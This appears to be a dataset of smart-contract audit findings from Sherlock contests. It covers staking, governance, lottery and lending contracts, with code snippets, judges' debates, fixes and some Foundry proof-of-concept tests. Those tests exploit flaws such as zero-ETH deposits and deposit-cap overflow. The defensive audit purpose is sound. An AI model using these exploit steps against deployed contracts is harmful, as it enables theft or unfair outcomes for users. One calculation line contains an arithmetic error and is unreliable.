fixed, impact is High, issue should be open and valid.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nmidori-fuse\nAdding to the escalation point, there is no way for governance to forcefully claim an unstaking (or any rewards that has been distributed). Therefore eventually the contract must be unpaused to avoid locking of existing funds, and the malicious actor fully gets away.\nOot2k\nAdditionally I think this issue should be judged as HIGH severity based on following facts:\nit create a clear loss of funds for the protocol (The main reason to freeze a validator is to penalize him for malicious behavior, this can include stealing funds / rewards)\nthere is no way to prevent this behavior without causing more damage\nattack cost is really low -> just transaction fee\nnevillehuang\n@Oot2k @midori-fuse @noslav Could you shed more details on how the validator can cheat and get rewarded fees and in what scenarios is a freeze initiated. It seems to me like a hypothetical scenario given my understanding is validator is still unstaking amounts that belongs to him, but could be significant.\nValidator cheats and gets rewarded fees.\nAdditionally, this issue seems to be dependent on a front-running attack vector, so:\nIf flashbots are considered similar to issue here to mitigate front-running, I believe this could be low severity\nIf not, if it is true that the freeze mechanism can be bypassed, then I believe this is medium severity, since it is dependent on a hypothetical scenario that validators turn malicious.\nAdditionally, is there any mechanisms in place to mitigate malicious validators?\nmidori-fuse\nProviding evidence for the bypassing of freeze mechanism. Search the following phrase within the contract:\n```\nrequire(!v.frozen, ""Validator is frozen"");\n```\n\nIt appears 6 times throughout the contract, and covers all entry points except `transferUnstakedOut()` (except admin and reward manager functions). Eyeballing all other external functions (except the ones mentioned) will show that they all go through `_stake()` or `_unstake()`, which has the appropriate check.\nFor `transferUnstakedOut()`, there is no check for whether the validator corresponding to that unstake has been frozen or not, neither is there in `_transferFromContract()`.\nThe flow for an unstaking to happen (for delegators or validators alike) is that:\nThe user calls `unstake()` or `unstakeAll()`.\nWait for the cooldown.\nCall `transferUnstakedOut()` to actually receive those tokens.\nThen the freeze is bypassed if the user is able to call unstake before the validator is frozen. Front-running is only required to maximize the getaway amounts by squeezing some extra rewards, you can just unstake before getting freeze and you bypass the freeze already. Therefore this is just a bypassing of freeze, and not dependent on front-running. We simply show the scenario which has the maximum impact.\nmidori-fuse\nFor the scenario where a validator cheats, there are certain ways for it to happen:\nTwo or more validators collude and are able to force quorum on certain sessions, earning them rewards on an incorrect block specimen.\nA validator finds a systemic exploit and/or simply not doing work correctly (e.g. admin determined them to repeatedly copy-paste other validators' works by watching the mempool or copying existing submissions, despite it being wrong or not). Note that a disabled validator can still unstake and get away with funds, unlike the frozen scenario (without the current bypassing issue).\nThe freeze is there to protect against these kind of situations.\nnevillehuang\nI personally am not convinced of this issue because the admins can always perform a system wide contract pause before freezing validators in separate transactions via flashbots (which pauses all actions, including transferUnstakedOut), which possibly mitigates this issue. This is in addition to the fact that there is a 28 day unstaking cooldown period which is more than sufficient time to react to malicious validators by admins (which in itself is a mitigation).\nSo I will leave it up to @Czar102 and sponsors to decide validity.\nmidori-fuse\n28 day unstaking cooldown does not mitigate this. As soon as the unstaking is done, the amount can be transferred out after 28 days (and the admin unpauses the system). Even if the system is paused, there are no admin actions that can revoke an unstaking that's on cooldown.\nKeeping the system paused equates to locking all funds, including other validators' funds and their respective delegators, and the admin still cannot take over the stolen funds.\nFurthermore the issue shows that freezing can be bypassed, and front-running is not a condition. The validator can just unstake right after the exploit, and the admin is already powerless before noticing the issue.\nJust adding some extra points. As part of the team making the escalation, we have the responsibility to provide extra information and any context the judges' might have missed, but we respect the judges' decision in any case.\nOot2k\nAgree with @midori-fuse here. Cooldown -> does not do anything because the malicious user still transfers tokens out (this is the root cause of this issue) Admin can pause protocol -> this will pause all actions for other users as well, as soon as the protocol is unpaused funds can be withdrawn again Malicious funds -> yes this report assumes there is a way to get funds maliciously and for this reason the team implemented the freeze mechanism\nI think this summarizes the issue pretty well and should be enough for Sherlock to validate.\nnevillehuang\nIf the hypothetical scenario of a way to cheat funds/validators being malicious is considered as a valid reason that break admin initiated pause mechanism, I can agree this is a valid medium since I believe the only way to resolve the issue is for the owner to perform an upgrade to the contract.\nAlthough I must say, the whole original submission is only presenting a front-running scenario, and the watsons only realized after that front-running is not necessary but did not include it in the original submission, and hence my arguments.\nCzar102\nGreat points made, the frontrunning argument is also not convincing to me since it's quite clear that this race condition is by design and it's admin's responsibility to keep the information about the freeze private until confirmation.\nBut, this issue can also be considered a loss of functionality (freezing stakes) due to the existence of a beneficial optimal game-theoretic behavior of the attacker.\nI'm currently inclined to accept this as a Medium severity issue.\nCzar102\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nOot2k: accepted\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/covalenthq/cqt-staking/pull/125/commits/de86308999d093a3f4553aa7094ed4d29be8beb0."чMalicious validators can front run freeze to withdraw tokens.\nCode Snippet\nTool used\nManual Review
`validatorMaxStake` can be bypassed by using `setValidatorAddress()`чmediumч```\nfunction setValidatorAddress(uint128 validatorId, address newAddress) external whenNotPaused {\n    // // rest of code\n    v.stakings[newAddress].shares += v.stakings[msg.sender].shares;\n    v.stakings[newAddress].staked += v.stakings[msg.sender].staked;\n    delete v.stakings[msg.sender];\n    // // rest of code\n}\n```\nч`setValidatorAddress()` allows a validator to migrate to a new address of their choice. However, the current logic only stacks up the old address' stake to the new one, never checking `validatorMaxStake`.\nThe current logic for `setValidatorAddress()` is as follow:\n```\nfunction setValidatorAddress(uint128 validatorId, address newAddress) external whenNotPaused {\n    // // rest of code\n    v.stakings[newAddress].shares += v.stakings[msg.sender].shares;\n    v.stakings[newAddress].staked += v.stakings[msg.sender].staked;\n    delete v.stakings[msg.sender];\n    // // rest of code\n}\n```\n\nThe old address' stake is simply stacked on top of the new address' stake. There are no other checks for this amount, even though the new address may already have contained a stake.\nThen the combined total of the two stakings may exceed `validatorMaxStake`. This accordingly allows the new (validator) staker's amount to bypass said threshold, breaking an important invariant of the protocol.\nBob the validator has a self-stake equal to `validatorMaxStake`.\nBob has another address, B2, with some stake delegated to Bob's validator.\nBob migrates to B2.\nBob's stake is stacked on top of B2. B2 becomes the new validator address, but their stake has exceeded `validatorMaxStake`.\nB2 can then repeated this procedure to addresses B3, B4, ..., despite B2 already holding more than the max allowed amount.\nBob now holds more stake than he should be able to, allowing him to earn an unfair amount of rewards compared to other validators.\nWe also note that, even if the admin tries to freeze Bob, he can front-run the freeze with an unstake, since unstakes are not blocked from withdrawing (after cooldown ends).чCheck that the new address's total stake does not exceed `validatorMaxStake` before proceeding with the migration.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: user can exceed max deposit and potentially increase his max delegator amoun; high(1)\nnoslav\nfixed by prevent new validator address stake from exceeding max stake - sa66/s…чBreaking an important invariant of the protocol.\nAllowing any validator to bypass the max stake amount. In turn allows them to earn an unfair amount of validator rewards in the process.\nAllows a validator to unfairly increase their max delegator amount, as an effect of increasing `(validator stake) * maxCapMultiplier`.\nCode Snippet\nTool used\nManual Review
Nobody can cast for any proposalчmediumч"```\nfunction getPriorVotes(address account, uint256 blockNumber) external view returns (uint256) {\n->      require(blockNumber < block.number, ""gOHM::getPriorVotes: not yet determined"");\n// rest of code// rest of code\n    }\n```\n"ч"The second parameter of `gohm.getPriorVotes(voter, block.number)` can only a number smaller than `block.number`. Please see the [code](https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code#L703) deployed by gOHM on the mainnet:\n```\nfunction getPriorVotes(address account, uint256 blockNumber) external view returns (uint256) {\n->      require(blockNumber < block.number, ""gOHM::getPriorVotes: not yet determined"");\n// rest of code// rest of code\n    }\n```\n\nTherefore, L446 will always revert. Voting will not be possible.\nCopy the coded POC below to one project from Foundry and run `forge test -vvv` to prove this issue."ч \nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nhaxatron commented:\nMedium. It would be caught immediately on deployment and implementation is upgradeable. There can be no loss of funds which is requisite of a high.\nIllIllI000\nAgree with haxatron that this is Medium, not High, based on Sherlock's rules\nnevillehuang\nCan agree, since this is purely a DoS, no malicious actions can be performed since no voting can be done anyways.\n@Czar102 I am interested in hearing your opinion, but I will set medium for now, because governance protocols fund loss impact is not obvious but I initially rated it high because it quite literally breaks the whole protocol. I believe sherlock needs to cater to different types of protocols and not only associate rules to defi/financial losses (example protocols include: governance, on chain social media protocols etc..)\n0xLienid\nFix: https://github.com/OlympusDAO/bophades/pull/293\nIllIllI000\nThe PR follows the suggested recommendation and correctly modifies the only place that solely `block.number` is used, changing it to `block.number` - 1. The only place not using this value is the call above it which uses `proposal.startBlock`. The `state()` when `startBlock` is equal to `block.number` is `ProposalState.Pending`, so this case will never cause problems, since there are checks of the state. The PR also modifies the mock gOHM contract to mirror the behavior that caused the bug.\ns1ce\nEscalate\nThis is a high. Voting is a core part of a governance protocol, and this bricks all voting functionality.\nsherlock-admin2\nEscalate\nThis is a high. Voting is a core part of a governance protocol, and this bricks all voting functionality.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xf1b0\nBesides the fact that this issue breaks the core logic of the contract, it won't be immediately detected upon deployment, as previously mentioned as the reason for downgrading the severity. The voting process only becomes possible after a proposal has been made and time has elapsed. At this point, the issue will be raised, necessitating the deployment of an update. While the new version is being prepared, the proposal may expire, and a new one will have to be created. If the proposal includes some critical changes, this time delay can pose a serious problem.\nIllIllI000\nIgnore this part since, while true, it appears to be confusing some: The sponsor mentioned this test file as where to look for how things will be deployed. The first action is to propose and start a vote for assigning the whitelist guardian, and that will flag the issue before anything else.\nFurthermore, the timelock needs to pull in order to become and admin with access to the treasury. Until that happens, the existing admin has the power to do anything, so there's no case where something critical can't be done. The 'pull' requirement for transferring the admin to the timelock is a requirement of the code, not of the test. The Sherlock rules also state that opportunity costs (e.g. delays in voting for example, due to a loss of core functionality) do not count as a loss of funds.\nr0ck3tzx\nThe test file within `setUp()` function configures the environment for testing, not for the actual deployment. The deployment process can and probably will look different, so no assumptions should be made based on the test file. The mention just shows how the `whitelistGuardian` will be configured, and not at what time/stage it will be done.\nThe LSW creates hypotheticals about how the deployment process might look, and because of that, the issue would be caught early. Anyone who has ever deployed a protocol knows that the process is complex and often involves use of private mempools. Making assumptions about the deployment without having actual deployment scripts is dangerous and might lead to serious issues.\n0xf1b0\nEven though some proposals may be initiated at the time of deployment, it will take between 3 to 7 days before the issue becomes apparent, as voting will not be available until then.\nnevillehuang\nI agree with watsons here, but would have to respect the decision of @Czar102 and his enforcement of sherlock rules. Governance protocols already have nuances of funds loss being not obvious, and the whole protocol revolves around voting as the core mechanism, if you cannot vote, you essentially lose the purpose of the whole governance.\n0xf1b0\nI've seen a lot of discussion regarding the rule of funds at risk. It seems that they never take into account the lost profits. A scenario where the core functionality of the system is broken could result in a loss of confidence in the protocol, causing users to be hesitant about investing their money due to the fear of such an issue recurring.\nCzar102\nFrom my understanding, due to the fact that the timelock needs to pull, the new governance contract needs to call it. And since it's completely broken, it will never pull the admin rights.\nHence, this is not a high severity impact of locking funds and rights in a governance, but a medium severity issue since the contract fails to work. Is it accurate? @IllIllI000\nIllIllI000\nYes, that's correct\nCzar102\nPlanning to reject the escalation and leave the issue as is.\n0xf1b0\nBy the way, it will not be possible to update the contract, because a new implementation can only be set through the voting process, which does not work.\nThat's at least 2 out of 3:\nit won't be immediately detected upon deployment\nit's not upgradeable\nIllIllI000\nit's being deployed fresh for this project, so it'll just be redeployed. The 2/3 stuff I think you're referring to is for new contests\nCzar102\nResult: Medium Has duplicates\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\ns1ce: rejectedчNobody can cast for any proposal. Not being able to vote means the entire governance contract will be useless. Core functionality is broken.\nCode Snippet\nTool used\nManual Review
User can get free entries if the price of any whitelisted ERC20 token is greater than the round's `valuePerEntry`чhighч```\n                if (isCurrencyAllowed[tokenAddress] != 1) {\n                    revert InvalidCollection();\n                }\n```\nчLack of explicit separation between ERC20 and ERC721 deposits allows users to gain free entries for any round given there exists a whitelisted ERC20 token with price greater than the round's `valuePerEntry`.\n```\n                if (isCurrencyAllowed[tokenAddress] != 1) {\n                    revert InvalidCollection();\n                }\n```\n\n```\n                if (singleDeposit.tokenType == YoloV2__TokenType.ERC721) {\n                    if (price == 0) {\n                        price = _getReservoirPrice(singleDeposit);\n                        prices[tokenAddress][roundId] = price;\n                    }\n```\n\n```\n                    uint256 entriesCount = price / round.valuePerEntry;\n                    if (entriesCount == 0) {\n                        revert InvalidValue();\n                    }\n```\n\n```\n            } else if (tokenType == TokenType.ERC721) {\n                for (uint256 j; j < itemIdsLengthForSingleCollection; ) {\n                    // rest of code\n                    _executeERC721TransferFrom(items[i].tokenAddress, from, to, itemIds[j]);\n```\n\n```\n    function _executeERC721TransferFrom(address collection, address from, address to, uint256 tokenId) internal {\n        // rest of code\n        (bool status, ) = collection.call(abi.encodeCall(IERC721.transferFrom, (from, to, tokenId)));\n        // rest of code\n    }\n```\n\nThe function signature of `transferFrom` for ERC721 and ERC20 is identical, so this will call `transferFrom` on the ERC20 contract with amount = `0` (since 'token ids' specified in `singleDeposit.tokenIdsOrAmounts` are all 0). Consequently, the user pays nothing and the transaction executes successfully (as long as the ERC20 token does not revert on zero transfers).\nч
Users can deposit ""0"" ether to any round"чhighч"```\nfor (uint256 i; i < numberOfRounds; ++i) {\n            uint256 roundId = _unsafeAdd(startingRoundId, i);\n            Round storage round = rounds[roundId];\n            uint256 roundValuePerEntry = round.valuePerEntry;\n            if (roundValuePerEntry == 0) {\n                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});\n            }\n\n            _incrementUserDepositCount(roundId, round);\n\n            // @review depositAmount can be ""0""\n            uint256 depositAmount = amounts[i];\n\n            // @review 0 % ANY_NUMBER = 0\n            if (depositAmount % roundValuePerEntry != 0) {\n                revert InvalidValue();\n            }\n            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);\n            expectedValue += depositAmount;\n\n            entriesCounts[i] = entriesCount;\n        }\n\n        // @review will not fail as long as user deposits normally to 1 round\n        // then he can deposit to any round with ""0"" amounts\n        if (expectedValue != msg.value) {\n            revert InvalidValue();\n        }\n```\n"ч"The main invariant to determine the winner is that the indexes must be in ascending order with no repetitions. Therefore, depositing ""0"" is strictly prohibited as it does not increase the index. However, there is a method by which a user can easily deposit ""0"" ether to any round without any extra costs than gas.\nAs stated in the summary, depositing ""0"" will not increment the entryIndex, leading to a potential issue with the indexes array. This, in turn, may result in an unfair winner selection due to how the upper bound is determined in the array. The relevant code snippet illustrating this behavior is found here.\nLet's check the following code snippet in the `depositETHIntoMultipleRounds` function\n```\nfor (uint256 i; i < numberOfRounds; ++i) {\n            uint256 roundId = _unsafeAdd(startingRoundId, i);\n            Round storage round = rounds[roundId];\n            uint256 roundValuePerEntry = round.valuePerEntry;\n            if (roundValuePerEntry == 0) {\n                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});\n            }\n\n            _incrementUserDepositCount(roundId, round);\n\n            // @review depositAmount can be ""0""\n            uint256 depositAmount = amounts[i];\n\n            // @review 0 % ANY_NUMBER = 0\n            if (depositAmount % roundValuePerEntry != 0) {\n                revert InvalidValue();\n            }\n            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);\n            expectedValue += depositAmount;\n\n            entriesCounts[i] = entriesCount;\n        }\n\n        // @review will not fail as long as user deposits normally to 1 round\n        // then he can deposit to any round with ""0"" amounts\n        if (expectedValue != msg.value) {\n            revert InvalidValue();\n        }\n```\n\nas we can see in the above comments added by me starting with ""review"" it explains how its possible. As long as user deposits normally to 1 round then he can also deposit ""0"" amounts to any round because the `expectedValue` will be equal to msg.value.\nTextual PoC: Assume Alice sends the tx with 1 ether as msg.value and ""amounts"" array as [1 ether, 0, 0]. first time the loop starts the 1 ether will be correctly evaluated in to the round. When the loop starts the 2nd and 3rd iterations it won't revert because the following code snippet will be ""0"" and adding 0 to `expectedValue` will not increment to `expectedValue` so the msg.value will be exactly same with the `expectedValue`.\n```\nif (depositAmount % roundValuePerEntry != 0) {\n                revert InvalidValue();\n            }\n```\n\n```\nfunction test_deposit0ToRounds() external {\n        vm.deal(user2, 1 ether);\n        vm.deal(user3, 1 ether);\n\n        // @dev first round starts normally\n        vm.prank(user2);\n        yolo.deposit{value: 1 ether}(1, _emptyDepositsCalldata());\n\n        // @dev user3 will deposit 1 ether to the current round(1) and will deposit\n        // 0,0 to round 2 and round3\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 1 ether;\n        amounts[1] = 0;\n        amounts[2] = 0;\n        vm.prank(user3);\n        yolo.depositETHIntoMultipleRounds{value: 1 ether}(amounts);\n\n        // @dev check user3 indeed managed to deposit 0 ether to round2\n        IYoloV2.Deposit[] memory deposits = _getDeposits(2);\n        assertEq(deposits.length, 1);\n        IYoloV2.Deposit memory deposit = deposits[0];\n        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));\n        assertEq(deposit.tokenAddress, address(0));\n        assertEq(deposit.tokenId, 0);\n        assertEq(deposit.tokenAmount, 0);\n        assertEq(deposit.depositor, user3);\n        assertFalse(deposit.withdrawn);\n        assertEq(deposit.currentEntryIndex, 0);\n\n        // @dev check user3 indeed managed to deposit 0 ether to round3\n        deposits = _getDeposits(3);\n        assertEq(deposits.length, 1);\n        deposit = deposits[0];\n        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));\n        assertEq(deposit.tokenAddress, address(0));\n        assertEq(deposit.tokenId, 0);\n        assertEq(deposit.tokenAmount, 0);\n        assertEq(deposit.depositor, user3);\n        assertFalse(deposit.withdrawn);\n        assertEq(deposit.currentEntryIndex, 0);\n    }\n```\n"чAdd the following check inside the depositETHIntoMultipleRounds function\n```\nif (depositAmount == 0) {\n     revert InvalidValue();\n   }\n```\n\nDiscussion\n0xhiroshi\nhttps://github.com/LooksRare/contracts-yolo/pull/176\nsherlock-admin2\n2 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because {valid: but the impact is very low compared to the duplicated issue 002}, ?\ntakarez commented:\nvalid: high(1)\nmstpr\nLooksRare/contracts-yolo#176\nFix LGTM!чHigh, since it will alter the games winner selection and it is very cheap to perform the attack.\nCode Snippet\nTool used\nManual Review
The number of deposits in a round can be larger than MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUNDчmediumч```\n        if (\n            _shouldDrawWinner(\n                startingRound.numberOfParticipants,\n                startingRound.maximumNumberOfParticipants,\n                startingRound.deposits.length\n            )\n        ) {\n            _drawWinner(startingRound, startingRoundId);\n        }\n```\nч"The number of deposits in a round can be larger than MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND, because there is no such check in depositETHIntoMultipleRounds() function or rolloverETH() function.\ndepositETHIntoMultipleRounds() function is called to deposit ETH into multiple rounds, so it's possible that the number of deposits in both current round and next round is MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND.\nWhen current round's number of deposits reaches MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND, the round is drawn:\n```\n        if (\n            _shouldDrawWinner(\n                startingRound.numberOfParticipants,\n                startingRound.maximumNumberOfParticipants,\n                startingRound.deposits.length\n            )\n        ) {\n            _drawWinner(startingRound, startingRoundId);\n        }\n```\n\n_drawWinner() function calls VRF provider to get a random number, when the random number is returned by VRF provider, fulfillRandomWords() function is called to chose the winner and the next round will be started:\n```\n                _startRound({_roundsCount: roundId});\n```\n\nIf the next round's deposit number is also MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND, _startRound() function may also draw the next round as well, so it seems that there is no chance the the number of deposits in a round can become larger than MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND:\n```\n            if (\n                !paused() &&\n                _shouldDrawWinner(numberOfParticipants, round.maximumNumberOfParticipants, round.deposits.length)\n            ) {\n                _drawWinner(round, roundId);\n            }\n```\n\nHowever, _startRound() function will draw the round only if the protocol is not paused. Imagine the following scenario:\nThe deposit number in `round 1` and `round 2` is MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND;\n`round 1` is drawn, before random number is sent back by VRF provider, the protocol is paused by the admin for some reason;\nRandom number is returned and fulfillRandomWords() function is called to start round 2;\nBecause protocol is paused, `round 2` is set to OPEN but not drawn;\nLater admin unpauses the protocol, before drawWinner() function can be called, some users may deposit more funds into `round 2` by calling depositETHIntoMultipleRounds() function or rolloverETH() function, this will make the deposit number of `round 2` larger than MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND.\nPlease run the test code to verify:\n```\n    function test_audit_deposit_more_than_max() public {\n        address alice = makeAddr(""Alice"");\n        address bob = makeAddr(""Bob"");\n\n        vm.deal(alice, 2 ether);\n        vm.deal(bob, 2 ether);\n\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 0.01 ether;\n        amounts[1] = 0.01 ether;\n\n        // Users deposit to make the deposit number equals to MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND in both rounds\n        uint256 MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND = 100;\n        for (uint i; i < MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND / 2; ++i) {\n            vm.prank(alice);\n            yolo.depositETHIntoMultipleRounds{value: 0.02 ether}(amounts);\n\n            vm.prank(bob);\n            yolo.depositETHIntoMultipleRounds{value: 0.02 ether}(amounts);\n        }\n\n        // owner pause the protocol before random word returned\n        vm.prank(owner);\n        yolo.togglePaused();\n\n        // random word returned and round 2 is started but not drawn\n        vm.prank(VRF_COORDINATOR);\n        uint256[] memory randomWords = new uint256[](1);\n        uint256 randomWord = 123;\n        randomWords[0] = randomWord;\n        yolo.rawFulfillRandomWords(FULFILL_RANDOM_WORDS_REQUEST_ID, randomWords);\n\n        // owner unpause the protocol\n        vm.prank(owner);\n        yolo.togglePaused();\n\n        // User deposits into round 2\n        amounts = new uint256[](1);\n        amounts[0] = 0.01 ether;\n        vm.prank(bob);\n        yolo.depositETHIntoMultipleRounds{value: 0.01 ether}(amounts);\n\n        (\n            ,\n            ,\n            ,\n            ,\n            ,\n            ,\n            ,\n            ,\n            ,\n            YoloV2.Deposit[] memory round2Deposits\n        ) = yolo.getRound(2);\n\n        // the number of deposits in round 2 is larger than MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND\n        assertEq(round2Deposits.length, MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND + 1);\n    }\n```\n"чAdd check in _depositETH() function which is called by both depositETHIntoMultipleRounds() function and rolloverETH() function to ensure the deposit number cannot be larger than MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND:\n```\n        uint256 roundDepositCount = round.deposits.length;\n\n// Add the line below\n       if (roundDepositCount >= MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND) {\n// Add the line below\n           revert MaximumNumberOfDepositsReached();\n// Add the line below\n       }\n\n        _validateOnePlayerCannotFillUpTheWholeRound(_unsafeAdd(roundDepositCount, 1), round.numberOfParticipants);\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\ninvalid: when the contract is paused; major functions are meant to stop working; and the chance of pausing is very low as it happen during an emergency\n0xhiroshi\nhttps://github.com/LooksRare/contracts-yolo/pull/180\nnevillehuang\nThe above comment is incorrect, since this can potentially impact outcome of game by bypassing an explicit rule/invariant of fixed 100 deposits per round, this should constitute medium severity\nmstpr\nLooksRare/contracts-yolo#180\nFix LGTM!чThis issue break the invariant that the number of deposits in a round can be larger than MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND.\nCode Snippet\nTool used\nManual Review
Low precision is used when checking spot price deviationчmediumч```\nnTokenOracleValue.sub(nTokenSpotValue).abs().mul(Constants.PERCENTAGE_DECIMALS).div(nTokenOracleValue);\n((nTokenOracleValue - nTokenSpotValue) * Constants.PERCENTAGE_DECIMALS) / nTokenOracleValue\n((1,000,000,000 - 980,000,001) * 100) / 1,000,000,000\n(19,999,999 * 100) / 1,000,000,000\n1,999,999,900 / 1,000,000,000 = 1.9999999 = 1\n```\nчLow precision is used when checking spot price deviation, which might lead to potential manipulation or create the potential for an MEV opportunity due to valuation discrepancy.\nAssume the following:\nThe max deviation is set to 1%\n`nTokenOracleValue` is 1,000,000,000\n`nTokenSpotValue` is 980,000,001\nBased on the above formula:\n```\nnTokenOracleValue.sub(nTokenSpotValue).abs().mul(Constants.PERCENTAGE_DECIMALS).div(nTokenOracleValue);\n((nTokenOracleValue - nTokenSpotValue) * Constants.PERCENTAGE_DECIMALS) / nTokenOracleValue\n((1,000,000,000 - 980,000,001) * 100) / 1,000,000,000\n(19,999,999 * 100) / 1,000,000,000\n1,999,999,900 / 1,000,000,000 = 1.9999999 = 1\n```\n\nThe above shows that the oracle and spot values have deviated by 1.99999%, which is close to 2%. However, due to a rounding error, it is rounded down to 1%, and the TX will not revert.ч"Consider increasing the precision.\nFor instance, increasing the precision from `Constants.PERCENTAGE_DECIMALS` (100) to 1e8 would have caught the issue mentioned earlier in the report even after the rounding down.\n```\nnTokenOracleValue.sub(nTokenSpotValue).abs().mul(1e8).div(nTokenOracleValue);\n((nTokenOracleValue - nTokenSpotValue) * 1e8) / nTokenOracleValue\n((1,000,000,000 - 980,000,001) * 1e8) / 1,000,000,000\n(19,999,999 * 1e8) / 1,000,000,000 = 1999999.9 = 1999999\n```\n\n1% of 1e8 = 1000000\n```\nrequire(deviationInPercentage <= maxValueDeviationPercent, ""Over Deviation Limit"")\nrequire(1999999 <= 1000000, ""Over Deviation Limit"") => Revert\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid because { This is valid}"чThe purpose of the deviation check is to ensure that the spot market value is not manipulated. If the deviation check is not accurate, it might lead to potential manipulation or create the potential for an MEV opportunity due to valuation discrepancy.\nCode Snippet\nTool used\nManual Review
External lending can exceed the thresholdчmediumч```\n700/1300 = 0.5384615385 (53%).\n```\nчDue to an incorrect calculation of the max lending amount, external lending can exceed the external withdrawal threshold. If this restriction/threshold is not adhered to, users or various core functionalities within the protocol will have issues redeeming or withdrawing their prime cash.\nThe following is the extract from the Audit Scope Documentation provided by the protocol team on the contest page that describes the external withdraw threshold:\n● External Withdraw Threshold: ensures that Notional has sufficient liquidity to withdraw from an external lending market. If Notional has 1000 units of underlying lent out on Aave, it requires 1000 * externalWithdrawThreshold units of underlying to be available on Aave for withdraw. This ensures there is sufficient buffer to process the redemption of Notional funds. If available liquidity on Aave begins to drop due to increased utilization, Notional will automatically begin to withdraw its funds from Aave to ensure that they are available for withdrawal on Notional itself.\nTo ensure the redeemability of Notional’s funds on external lending markets, Notional requires there to be redeemable funds on the external lending market that are a multiple of the funds that Notional has lent on that market itself.\nAssume that the `externalWithdrawThreshold` is 200% and the underlying is USDC. Therefore, `PERCENTAGE_DECIMALS/externalWithdrawThreshold = 100/200 = 0.5` (Line 83-84 below). This means that the number of USDC to be available on AAVE for withdrawal must be two (2) times the number of USDC Notional lent out on AAVE (A multiple of 2).\nThe `externalUnderlyingAvailableForWithdraw` stores the number of liquidity in USDC on the AAVE pool available to be withdrawn.\nIf `externalUnderlyingAvailableForWithdraw` is 1000 USDC and `currentExternalUnderlyingLend` is 400 USDC, this means that the remaining 600 USDC liquidity on the AAVE pool is not owned by Notional.\nThe `maxExternalUnderlyingLend` will be `600 * 0.5 = 300`. Thus, the maximum amount that Notional can lend externally at this point is 300 USDC.\nAssume that after Notional has lent 300 USDC externally to the AAVE pool.\nThe `currentExternalUnderlyingLend` will become `400+300=700`, and the `externalUnderlyingAvailableForWithdraw` will become `1000+300=1300`\nFollowing is the percentage of USDC in AAVE that belong to Notional\n```\n700/1300 = 0.5384615385 (53%).\n```\n\nAt this point, the invariant is broken as the number of USDC to be available on AAVE for withdrawal is less than two (2) times the number of USDC lent out on AAVE after the lending.\nThe root cause is that when USDC is deposited to AAVE to get aUSDC, the total USDC in the pool increases. Therefore, using the current amount of USDC in the pool to determine the maximum deposit amount is not an accurate measure of liquidity risk.ч"
Rebalance might be skipped even if the external lending is unhealthyчmediumч```\noffTargetPercentage = abs(90 - 100) / (100 + 90) = 10 / 190 = 0.0526 = 5.26%\n```\nчThe deviation between the target and current lending amount (offTargetPercentage) will be underestimated due to incorrect calculation. As a result, a rebalancing might be skipped even if the existing external lending is unhealthy.\nThe formula used within the `_isExternalLendingUnhealthy` function below calculating the `offTargetPercentage` can be simplified as follows for the readability of this issue.\n$$ offTargetPercentage = \frac{\mid currentExternalUnderlyingLend - targetAmount \mid}{currentExternalUnderlyingLend + targetAmount} \times 100% $$\nAssume that the `targetAmount` is 100 and `currentExternalUnderlyingLend` is 90. The off-target percentage will be 5.26%, which is incorrect.\n```\noffTargetPercentage = abs(90 - 100) / (100 + 90) = 10 / 190 = 0.0526 = 5.26%\n```\n\nThe correct approach is to calculate the off-target percentages as a ratio of the difference to the target:\n$$ offTargetPercentage = \frac{\mid currentExternalUnderlyingLend - targetAmount \mid}{targetAmount} \times 100% $$\n```\noffTargetPercentage = abs(90 - 100) / (100) = 10 / 100 = 0.0526 = 10%\n```\nч
